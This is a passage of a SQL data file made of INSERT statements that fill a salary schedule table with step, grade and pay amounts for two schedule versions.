INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '7', '15587.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '7', '15725.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '15818.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '8', '15969.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '8', '16121.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '8', '16275.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '8', '16430.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '8', '16586.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '8', '16744.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '8', '16903.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '16986.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '9', '17142.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '9', '17299.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '9', '17458.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '9', '17618.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '9', '17780.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '9', '17943.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '9', '18108.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '18217.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '10', '18385.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '10', '18553.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '10', '18724.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '10', '18896.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '10', '19095.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '10', '19244.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '10', '19421.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '19620.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '11', '19853.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '11', '20088.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '11', '20326.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '11', '20567.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '11', '20811.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '11', '21058.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '11', '21307.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '21387.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '12', '21626.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '12', '21868.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '12', '22113.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '12', '22361.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '12', '22611.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '12', '22864.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '12', '23120.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '23257.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '13', '23517.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '13', '23780.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '13', '24047.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '13', '24315.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '13', '24587.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '13', '24863.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '13', '25141.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '25290.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '14', '25573.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '14', '25859.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '14', '26149.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '14', '26441.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '14', '26737.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '14', '27036.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '14', '27339.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '27565.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '15', '27887.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '15', '28214.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '15', '28544.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '15', '28877.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '15', '29214.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '15', '29557.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '15', '29902.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '30044.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '16', '30396.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '16', '30751.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '16', '31111.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '16', '31474.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '16', '31843.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '16', '32215.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '16', '32592.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '32747.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '17', '33131.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '17', '33518.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '17', '33909.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '17', '34306.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '34707.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '35113.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '35524.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '35693.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '36111.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '36532.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '36960.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '37392.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '37829.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '38272.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '38719.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '39151.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '39685.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '40227.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '40776.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '41333.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '41898.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '42470.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '43051.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '43250.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '43841.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '44440.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '45047.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '45662.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '46285.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '46917.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '47559.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '47779.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '48432.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '49094.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '49764.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '50443.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '51132.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '51831.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '52539.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '52783.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '53503.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '54234.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '54975.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '55726.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '56487.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '57258.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '58040.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '58310.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '59106.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '59913.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '60732.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '61561.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '62402.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '63255.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '64118.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '64416.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '65296.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '66187.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '67092.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '68008.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '68937.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '69878.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '70832.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '71476.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '72452.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '73441.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '74444.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '75461.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '76491.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '77536.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '78595.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '78960.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '80039.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '81132.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '82240.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '83363.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '84502.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '85657.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '86825.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '87229.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '88420.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '89628.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '90852.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '92093.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '93351.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '94625.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '95925.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '96363.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '97679.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '99013.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '100366.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '101736.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '103126.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '104534.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '105962.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '106454.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '107908.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '109382.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '110875.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '112390.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '113925.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '115481.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '117058.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '117601.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '119208.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '120836.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '122486.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '124159.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '125855.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '127855.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '129316.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '152325.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '154649.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '157008.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '159404.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '161836.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '164305.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '166812.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '169357.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '177929.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '180700.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '33', '222278.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '215804.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '198255.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '195215.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '192221.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '189274.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '186372.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '183513.00', '5');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '11068.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '1', '11160.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '1', '11254.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '1', '11348.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '1', '11443.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '1', '11538.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '1', '11635.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '1', '11732.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '11761.00', '6');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '2', '11851.00', '6');
